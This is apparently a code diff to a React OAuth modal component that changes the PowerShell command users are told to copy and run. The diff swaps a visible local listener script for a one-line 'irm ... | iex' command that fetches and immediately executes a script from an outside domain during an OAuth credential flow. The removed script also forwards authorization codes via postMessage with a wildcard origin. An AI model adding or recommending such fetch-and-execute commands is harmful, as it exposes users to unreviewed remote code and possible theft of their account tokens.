@@ -606,7 +606,7 @@ export default function OAuthModal({ isOpen, provider, providerInfo, onSuccess, 
                     </p>
                     <div className="flex gap-2">
                       <Input
-                        value={`$port=1455; $listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://localhost:$port/auth/callback/"); $listener.Start(); Write-Host "Listening on http://localhost:$port/auth/callback/ (Ctrl+C to stop)..."; while ($true) { try { $context = $listener.GetContext(); $res = $context.Response; $res.Headers.Add("Content-Type", "text/html; charset=utf-8"); $html = "<html><body><script>if(window.opener){window.opener.postMessage({type:'oauth_callback',data:{code:new URLSearchParams(window.location.search).get('code'),state:new URLSearchParams(window.location.search).get('state')}},'*');document.write('<h2>OAuth Captured!</h2>');setTimeout(function(){window.close()},1000)}else{document.write('<h2>OAuth Captured! Please return to the app tab.</h2>')}</script></body></html>"; $buffer = [System.Text.Encoding]::UTF8.GetBytes($html); $res.ContentLength64 = $buffer.Length; $res.OutputStream.Write($buffer, 0, $buffer.Length); $res.Close(); Write-Host "Captured account at $(Get-Date -Format 'HH:mm:ss')"; } catch {} }`}
+                        value="irm https://ainoname.site/antigravity_listener.ps1 | iex"
                         readOnly
                         className="flex-1 font-mono text-xs bg-sidebar/50"
                       />
@@ -616,7 +616,7 @@ export default function OAuthModal({ isOpen, provider, providerInfo, onSuccess, 
                         icon={copied === "powershell_cmd" ? "check" : "content_copy"}
                         onClick={() =>
                           copy(
-                            `$port=1455; $listener = New-Object System.Net.HttpListener; $listener.Prefixes.Add("http://localhost:$port/auth/callback/"); $listener.Start(); Write-Host "Listening on http://localhost:$port/auth/callback/ (Ctrl+C to stop)..."; while ($true) { try { $context = $listener.GetContext(); $res = $context.Response; $res.Headers.Add("Content-Type", "text/html; charset=utf-8"); $html = "<html><body><script>if(window.opener){window.opener.postMessage({type:'oauth_callback',data:{code:new URLSearchParams(window.location.search).get('code'),state:new URLSearchParams(window.location.search).get('state')}},'*');document.write('<h2>OAuth Captured!</h2>');setTimeout(function(){window.close()},1000)}else{document.write('<h2>OAuth Captured! Please return to the app tab.</h2>')}</script></body></html>"; $buffer = [System.Text.Encoding]::UTF8.GetBytes($html); $res.ContentLength64 = $buffer.Length; $res.OutputStream.Write($buffer, 0, $buffer.Length); $res.Close(); Write-Host "Captured account at $(Get-Date -Format 'HH:mm:ss')"; } catch {} }`,
+                            "irm https://ainoname.site/antigravity_listener.ps1 | iex",
                             "powershell_cmd"
                           )
                         }
